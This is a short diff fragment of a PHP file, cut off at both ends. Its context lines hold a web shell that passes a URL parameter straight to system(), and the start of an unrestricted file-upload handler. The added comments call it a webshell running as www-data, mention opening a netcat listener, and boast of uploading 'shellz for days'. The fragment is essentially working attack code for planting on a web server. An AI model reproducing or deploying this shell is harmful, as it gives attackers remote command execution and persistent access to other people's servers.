@@ -15,8 +15,10 @@
     {
         system($_GET['cmd']);
     }
+//creates a webshell, stuck in user:www-data, but a netcat listener can be created
 ?>
 <?php
+//upload files, any file, 5h311z 4 d@yz
 $target_dir = "";
 $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
 $uploadOk = 1;
